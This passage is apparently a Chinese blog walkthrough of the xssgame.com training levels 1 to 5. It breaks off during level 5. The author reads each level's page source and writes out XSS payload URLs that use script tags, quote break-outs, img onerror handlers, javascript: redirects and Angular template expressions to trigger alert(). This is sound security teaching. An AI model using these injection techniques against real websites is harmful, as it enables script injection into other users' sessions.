</p>\n<blockquote>\n<p>此级别显示XSS的常见原因，其中用户输入直接写入页面而不进行正确的转义。<br>与下面的脆弱应用程序窗口进行交互，并找到一种方法来执行您选择的JavaScript。 您可以在易受攻击的窗口内采取行动，或直接编辑其网址栏。<br>输入一个将使应用程序在JavaScript中执行alert()函数的输入。<br>一旦您弹出警报，该解决方案将在服务器端进行验证，您将能够进入下一个级别。 重要的是，解决方案不需要用户交互 - 打开URL应该足以触发警报。<br>–来自原汁原味的 translate.google.com （自己感受下）</p>\n</blockquote>\n<p>「说人话！」</p>\n<p>通过改造URL，在访问原页面时执行 javascript 的 alert()，并且保证任何人直接访问你修改后的URL时都能弹出alert框……。</p>\n<p>至于 javascript、alert 是什么，alert 与 XSS 到底是什么关系，为啥 XSS 的游戏要让你用 alert 过关呢，我就不赘述了，百度一下你就上当：）</p>\n<p>「上当咋整啊，本来就啥都不会，不能告诉个不上当的方法？」</p>\n<p>你别说，还真能：</p>\n<p><img src=\"/Image/ad.png\" alt=\"ad\"></p>\n<p>//我是一个不生硬的过度，下面开始正题 →_→ 跑太远扯不回来了</p>\n<p>我们打开 chrome 浏览器的开发者工具(F12)看一下这个站的页面相关文件。</p>\n<p><img src=\"/Image/Level_1_Tree_Detail.png\" alt=\"LEVEL_1_TREE_DETAIL\"></p>\n<p>其中 <em>index</em> 是主页文件，<em>foogle.png</em> 是大 Foogle Logo，唯独 <em>js_frame.js</em> 不确定。进去看看后发现这个文件是判定你的 XSS 是否符合要求的“xssgame 游戏的官方文件”，这里不分析，因其非本篇重点，直接给定义略过。</p>\n<p><em>index</em> 中是一个简单的 form 表单的提交。我们随便搜点什么后：<br>1.URL 变化<br>2.页面重新加载<br>3.刚刚搜索的内容被一起加载到也页面中。  </p>\n<p>其中 URL 结尾的 ?query= 后面的字符串跟页面上显示的字符串一致。<br>回到我们的初衷，要让其弹窗。那我们只需要让页面被嵌入一段被加载时弹窗的 javascript 代码段就好了：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;alert()&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>拼出如下URL：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/m4KKGHi2rVUN/?query=&lt;script&gt;alert()&lt;/script&gt;</div></pre></td></tr></table></figure>\n<p><strong>使其在页面加载时就载入含有 alert 效果的 javascript 代码块。</strong></p>\n<p>过关：<br><img src=\"/Image/LEVEL_1_Pass.png\" alt=\"LEVEL_1_PASS\"></p>\n<h2 id=\"LEVEL-2\"><a href=\"#LEVEL-2\" class=\"headerlink\" title=\"LEVEL 2\"></a>LEVEL 2</h2><p><a href=\"http://www.xssgame.com/WrfpuKFX8GNr\" target=\"_blank\" rel=\"external\">贴心的传送门</a></p>\n<p><img src=\"/Image/Level_2_Welcome.png\" alt=\"StartPlay2\"></p>\n<hr>\n<p>来看一下页面上的信息：</p>\n<blockquote>\n<p>用户提供的数据的每一位都必须正确地转义为其出现的页面的上下文。 这个级别显示为什么。<br>输入一个将使应用程序在JavaScript中执行alert()函数的输入。<br>–来自原汁原味的 translate.google.com （哎，不背锅，哎）</p>\n</blockquote>\n<p>大意是在提醒我们，要注意每一个比特。<br>举个栗子：你以为你家孩子就是你亲生的，但隔壁老王每天冲你笑，毕竟你不是每天晚上都在家。 </p>\n<p>// 不生硬，一点都不生硬的过度</p>\n<p>初次加载的文件中规中矩，一个<em>index</em>里面一个通过 GET 方式提交的 form 表单，表单提交一个 timer 参数给后台，以及一个 js_frame.js 文件。</p>\n<p>我们先填一个正常的参数，提交一下试试看，默认是3，那就填3吧：<br><img src=\"/Image/Level_2_Create_Timer.png\" alt=\"CreateTimer\"></p>\n<p>来看一下新跳转的页面有哪些需要注意的东西：<br><img src=\"/Image/Level_2_Timer_Js.png\" alt=\"CreateTimer\"></p>\n<p>我们观察发现：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">id</span>=<span class=\"string\">\"loading\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/static/img/loading.gif\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 50%\"</span> <span class=\"attr\">onload</span>=<span class=\"string\">\"startTimer('3');\"</span> /&gt;</span></div></pre></td></tr></table></figure></p>\n<p>和<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"message\"</span>&gt;</span>Your timer will execute in 3 seconds.<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>两处回显了我们的数据。而前半部 javascript 代码也有一个3：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">startTimer</span>(<span class=\"params\">seconds</span>) </span>&#123;</div><div class=\"line\">    seconds = <span class=\"built_in\">parseInt</span>(seconds) || <span class=\"number\">3</span>;</div><div class=\"line\">    setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">        <span class=\"built_in\">window</span>.confirm(<span class=\"string\">\"Time is up!\"</span>);</div><div class=\"line\">        <span class=\"built_in\">window</span>.loading.style.display = <span class=\"string\">'none'</span>;</div><div class=\"line\">        <span class=\"built_in\">window</span>.message.innerHTML = <span class=\"string\">'&lt;a href=\"?\"&gt;Go back&lt;/a&gt; to the timer setup page'</span>;</div><div class=\"line\">    &#125;, seconds * <span class=\"number\">1000</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>提交其他参数后发现，跟我们提交的参数无关，无视之。<br>那么前两处中，我们先看第一处（看到这个字就有点怪怪的感觉……）：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">id</span>=<span class=\"string\">\"loading\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/static/img/loading.gif\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 50%\"</span> <span class=\"attr\">onload</span>=<span class=\"string\">\"startTimer('3');\"</span> /&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这里可以搞：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">onload = <span class=\"string\">\"startTimer('3');\"</span></div></pre></td></tr></table></figure></p>\n<p>怎么搞呢，你需要知道一个知识点：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"string\">'a'</span> + alert(); <span class=\"comment\">// 或者 '-' 也可以，重点在于让 alert() 参与运算</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// 当 alert() 参与运算的时候</span></div><div class=\"line\">    <span class=\"comment\">// js 会尝试让 alert() 先执行</span></div><div class=\"line\">    <span class=\"comment\">// 然后取其执行后的返回值再参与前面的运算</span></div><div class=\"line\">    <span class=\"comment\">// 我就问你任性不。「任性~」『←_← 真尼玛能给自己加戏』</span></div><div class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure></p>\n<p>我们再结合 img 标签的 onload 事件：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">onload = <span class=\"string\">\"startTime('?')\"</span>; <span class=\"comment\">// 这里需要把上面的知识点利用上 也就是把 alert() 以合适的体位插入 ? 的地方</span></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">    别往下瞅了，下面就是答案了，自己不寻思寻思啊</div><div class=\"line\">    强行占一行</div><div class=\"line\">    再来一行</div><div class=\"line\">    嗯，上下注释符号还能占两行，差不多了。</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"comment\">// 先尝试直接插入alert()</span></div><div class=\"line\">onload = <span class=\"string\">\"startTimer('alert()')\"</span>; <span class=\"comment\">// startTimer('alert()'); …… 这不直接当字符串传过去了吗…… 不行</span></div><div class=\"line\"><span class=\"comment\">// 看看上面的知识点……</span></div><div class=\"line\"><span class=\"comment\">// 插入 a'+alert()+'a</span></div><div class=\"line\">onload = <span class=\"string\">\"startTimer('a'+alert()+'a')\"</span>; <span class=\"comment\">// 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串</span></div><div class=\"line\"><span class=\"comment\">// 插入 '+alert()+'</span></div><div class=\"line\">onload = <span class=\"string\">\"startTimer(''+alert()+'')\"</span>;</div></pre></td></tr></table></figure></p>\n<p>嗯，想好了体位，接下来要后退几步，对着 URL 酝酿一下~<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;+alert()+&apos;</div></pre></td></tr></table></figure></p>\n<p>提交一下……<br>「我曹不对吧」<br>「这也没过关啊，日，讲啥呢一天天。」<br>「你哔哔这么长时间，念经呢这是？」<br>别着急，’+’ 号在URL里有独特的含义，直接写进去就当成URL约定的含义去解读了。<br>我们这边转义一下这个’+’字符,在 chrome 控制台中输入这个函数并按回车，会返回给你一个转义后的字符串：<br><img src=\"/Image/Level_2_URL_Encode.png\" alt=\"Level_2_URL_Encode\"><br>我们用%2B（或%2b）替换一下原来的加号。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;%2Balert()%2B&apos;</div></pre></td></tr></table></figure></p>\n<p>过关：<br><img src=\"/Image/Level_2_Pass.png\" alt=\"Level_2_Pass\"><br>上图中的 URL 虽然我们提交的是’%2B’,浏览器最后再显示给你的时候会自动帮你转回来方便你阅读。如果你此时不修改’+’为’%2B’再提交一次，你就会发现你提交的是’+’,我们也并没有再次过关 :)<br>另外，直接用’-‘号其实没这么麻烦，不用转义，直接写就行 :)<br>「……」<br><img src=\"/Image/pugaizai.jpeg\" alt=\"pugai\"><br><strong>上面的两chu，我只说了第一chu，那第二chu朋友们自行尝试（第一关的套路照搬过来行不通哟~）</strong></p>\n<h2 id=\"LEVEL-3\"><a href=\"#LEVEL-3\" class=\"headerlink\" title=\"LEVEL 3\"></a>LEVEL 3</h2><p><a href=\"http://www.xssgame.com/u0hrDTsXmyVJ\" target=\"_blank\" rel=\"external\">贴心传送门</a>  </p>\n<p><img src=\"/Image/Level_3_Welcome.png\" alt=\"Level_3_Welcome\">  </p>\n<hr>\n<p>见证机翻的时刻：</p>\n<blockquote>\n<p>复杂的Web应用程序通常会在JavaScript中生成UI的部分内容。 一些常见的JS功能是执行接收器，这意味着它们将导致浏览器执行出现在其输入中的任何脚本。<br>该级别的应用程序正在使用一个这样的接收器。<br>由于您无法在应用程序中的任何位置输入您的负载，因此您必须手动编辑提供的URL栏中的地址。 目标是利用应用程序中的一个漏洞来执行JavaScript alert()函数。<br>–来自看完觉得没什么卵用的 translate.google.com  </p>\n</blockquote>\n<p>其实我在通这个系列的时候是没看这些提示信息的，一是觉得不看也能过，二是怕自己的想法被提示牵着走，这样过关也挺没劲的。嗯，类似「圣人模式」那种惆怅。<br>后来总结的时候呢，发现里面确实是有一些信息的，写经验的时候还是写进来比较好，万一对一些人有帮助呢，所以我就插了个机翻，并因为经费紧张，旁白君的解读直接砍掉了:) </p>\n<p>// 过渡~<br>看得出来，这是一位吸猫癌患者:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"tab1\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"chooseTab('1')\"</span>&gt;</span>Cat 1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"tab2\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"chooseTab('2')\"</span>&gt;</span>Cat 2<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tab\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"tab3\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"chooseTab('3')\"</span>&gt;</span>Cat 3<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p><em>index</em> 里非常暴躁的来了个 Cat 1 2 3，直让我菊花一紧：  </p>\n<p><img src=\"/Image/shut_up_and_bbox.jpg\" alt=\"bbox\">  </p>\n<p>奈何对猫有些抗拒，看见 onclick 事件基本没什么点一下试试看的想法，那就只能看代码了：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">chooseTab</span>(<span class=\"params\">name</span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">var</span> html = <span class=\"string\">\"Cat \"</span> + <span class=\"built_in\">parseInt</span>(name) + <span class=\"string\">\"&lt;br&gt;\"</span>;</div><div class=\"line\">    html += <span class=\"string\">\"&lt;img src='/static/img/cat\"</span> + name + <span class=\"string\">\".jpg' /&gt;\"</span>;</div><div class=\"line\">    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'tabContent'</span>).innerHTML = html;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Select the current tab</span></div><div class=\"line\">    <span class=\"keyword\">var</span> tabs = <span class=\"built_in\">document</span>.querySelectorAll(<span class=\"string\">'.tab'</span>);</div><div class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; tabs.length; i++) &#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (tabs[i].id == <span class=\"string\">\"tab\"</span> + <span class=\"built_in\">parseInt</span>(name)) &#123;</div><div class=\"line\">            tabs[i].className = <span class=\"string\">\"tab active\"</span>;</div><div class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">            tabs[i].className = <span class=\"string\">\"tab\"</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"built_in\">window</span>.location.hash = name;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Tell parent we've changed the tab</span></div><div class=\"line\">    top.postMessage(&#123;<span class=\"string\">'url'</span>: self.location.toString()&#125;, <span class=\"string\">\"*\"</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>这个方法的实现看到第三行就不用看了，已经知道在干嘛了，传进来一个数字，请求相应’数字.jpg’的图片。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 &lt;script&gt;...&lt;/script&gt; 并不会被执行。</div></pre></td></tr></table></figure></p>\n<p>没关系啊，有了上一关的经验，我们可以拼字符串啊。<br>佛死特奥富奥，你得知道个知识点：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert()'</span> /&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--</span></div><div class=\"line\">    当图片加载错误的时候，就会执行 onerror 中的 alert() 方法</div><div class=\"line\">    对于本关</div><div class=\"line\">    我们只需要让他访问一个不存在的图片并让其执行 onerror='alert()' 就OK了</div><div class=\"line\">    你问我怎么让它执行？</div><div class=\"line\">    插啊，插进去不就行了吗 →_→</div><div class=\"line\">--&gt;</div></pre></td></tr></table></figure></p>\n<p>我们拼出如下URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/u0hrDTsXmyVJ/#1&apos; onerror=&apos;alert()&apos;</div></pre></td></tr></table></figure></p>\n<p><strong>用单引号截断1,使其 scr 指向’1’这个文件，并加入 onerror 事件，而因为’1’这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。</strong></p>\n<p>过关：<br><img src=\"/Image/Level_3_Pass.png\" alt=\"Level_3_Pass\"></p>\n<h2 id=\"LEVEL-4\"><a href=\"#LEVEL-4\" class=\"headerlink\" title=\"LEVEL 4\"></a>LEVEL 4</h2><p><a href=\"http://www.xssgame.com/__58a1wgqGgI\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_4_Welcome.png\" alt=\"Level_4_Welcome\">  </p>\n<p>来看一下提示里面的有效信息:</p>\n<blockquote>\n<p>跨站点脚本不仅仅是正确地转义数据。 有时，即使没有在DOM中注入新的元素，攻击者也可以做坏事。</p>\n</blockquote>\n<p>再来看一下页面内容：</p>\n<p><img src=\"/Image/Level_4_Sign_Up.png\" alt=\"Level_4_Sign_up\"></p>\n<p>我们先跟着流程走一下，过程中看看有没有什么可利用的地方：</p>\n<p>sign up 按钮的代码是这样的：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"signup?next=confirm\"</span>&gt;</span>Sign up<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>点击以后，我们跳转到这个页面：</p>\n<p><img src=\"/Image/Level_4_Enter_Email.png\" alt=\"Level_4_Enter_Email\"></p>\n<p>页面中有一段注释：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- We're ignoring the email, but the poor user will never know! --&gt;</span></div></pre></td></tr></table></figure></p>\n<p>……神经病</p>\n<p>next &gt;&gt; 的代码是这样：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"confirm?next=welcome\"</span>&gt;</span>Next &gt;&gt;<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>点击 next &gt;&gt; 会跳转到下一个页面</p>\n<p><img src=\"/Image/Level_4_Thanks_For.png\" alt=\"Level_4_Thanks_For\"></p>\n<p>页面代码如下：</p>\n<p><img src=\"/Image/Level_4_Thanks_For_Source.png\" alt=\"Level_4_Thanks_For_Source\"></p>\n<p>我们注意到有这样一个地方：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\">    setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"built_in\">window</span>.location = <span class=\"string\">'welcome'</span>; &#125;, <span class=\"number\">1000</span>);</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>\n<p>其中的’Welcome’像是我们 URL 中传入的参数。<br>经传入其他参数测试，发现 window.location = 我们传入的参数。<br>这样问题就简单了，首先，知识点你得有：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">window</span>.location = <span class=\"string\">'welcome'</span>; </div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\">    这是一个页面重定向的操作</div><div class=\"line\">    这里就不展开普及了,可以去 w3school 充充电。</div><div class=\"line\">    window.location 等同于 window.location.href</div><div class=\"line\">    而 DOM 的 href 属性呢，支持这样写：</div><div class=\"line\">    &lt;a href='javascript:alert()' &gt; &lt;/a&gt;</div><div class=\"line\">    咳咳，你懂得。</div><div class=\"line\">*/</div></pre></td></tr></table></figure></p>\n<p>所以这边只需要传入：’javascript:alert()’ 来替换 ‘welcome’ 就可以了：<br>拼出如下 URL:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert()</div></pre></td></tr></table></figure></p>\n<p>过关:<br><img src=\"/Image/Level_4_Pass.png\" alt=\"Level_4_Pass.png\"></p>\n<h2 id=\"LEVEL-5\"><a href=\"#LEVEL-5\" class=\"headerlink\" title=\"LEVEL 5\"></a>LEVEL 5</h2><p><a href=\"http://www.xssgame.com/JFTG_t7t3N-P\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_5_Welcome.png\" alt=\"Level_5_Welcome\"></p>\n<p>有请我们的翻译君：</p>\n<blockquote>\n<p>Angular是一个非常受欢迎的框架，它在安全开发应用程序时拥有自己的一套规则。 其中之一是在Angular的模板系统运行之前修改DOM时应该小心。<br>这个挑战是为什么这很重要。<br>目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。  </p>\n</blockquote>\n<p>对，我们查看页面文件结构的时候也注意到了这次的页面使用了 Angular。</p>\n<p>「Angular是啥？」</p>\n<p><img src=\"/Image/hei1.jpeg\" alt=\"heiren\"></p>\n<p>其实 Angular 是啥不重要，即使不了解，还是可以搞的哈，别着急。</p>\n<p>我们先常规思路分析一波，先看看页面文件的内容：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\">      angular.module(<span class=\"string\">'myApp'</span>, [])</div><div class=\"line\">      .controller(<span class=\"string\">'myController'</span>, [<span class=\"string\">'$scope'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">$scope</span>) </span>&#123;</div><div class=\"line\">        $scope.query = <span class=\"string\">\"\"</span>;</div><div class=\"line\">        $scope.alert = <span class=\"built_in\">window</span>.alert;</div><div class=\"line\">      &#125;]);</div><div class=\"line\"></div><div class=\"line\">      <span class=\"keyword\">var</span> UTM_PARAMS = [<span class=\"string\">\"utm_content\"</span>, <span class=\"string\">\"utm_medium\"</span>, <span class=\"string\">\"utm_source\"</span>,</div><div class=\"line\">          <span class=\"string\">\"utm_campaign\"</span>, <span class=\"string\">\"utm_term\"</span>]</div><div class=\"line\"></div><div class=\"line\">      <span class=\"keyword\">if</span> (location.search)</div><div class=\"line\">      &#123;</div><div class=\"line\">        <span class=\"keyword\">var</span> params = location.search.substring(<span class=\"number\">1</span>).split(<span class=\"string\">'&amp;'</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p <span class=\"keyword\">in</span> params) &#123;</div><div class=\"line\">          <span class=\"keyword\">var</span> r = params[p].split(<span class=\"string\">'='</span>);</div><div class=\"line\"></div><div class=\"line\">          <span class=\"keyword\">if</span> (r.length == <span class=\"number\">2</span> &amp;&amp; UTM_PARAMS.indexOf(r[<span class=\"number\">0</span>]) != <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">            <span class=\"keyword\">var</span> el = <span class=\"built_in\">document</span>.getElementsByName(r[<span class=\"number\">0</span>]);</div><div class=\"line\">            <span class=\"keyword\">if</span> (el.length) el[<span class=\"number\">0</span>].value = <span class=\"built_in\">decodeURIComponent</span>(r[<span class=\"number\">1</span>]);</div><div class=\"line\">          &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">      &#125;</div><div class=\"line\">    &lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这里就提供了足够的信息够我们过关了。<br>这段 js 的逻辑每一步是什么样的我就不细说了，大家自己看吧，我就说说大体是在干什么吧。<br>先定义了一个数组，用来过滤 URL 中的参数。<br>过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"demo2-query\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"query\"</span> <span class=\"attr\">maxlength</span>=<span class=\"string\">\"140\"</span> <span class=\"attr\">ng-model</span>=<span class=\"string\">\"query\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"Enter query here...\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"utm_term\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"utm_campaign\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"cpc\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">\"demo2-button\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Search\"</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>聪明的小伙伴听到给页面的节点赋值应该就开窍了，对了，这里可以搞啊可以搞。<br>怎么搞呢？<br>我们先搜下 Angular 中 alert 怎么写：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;&#123;alert()&#125;&#125;</div></pre></td></tr></table></figure></p>\n<p>好知道了这个我们构建 URL，就选择 ‘utm_term’ 这个节点吧：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div 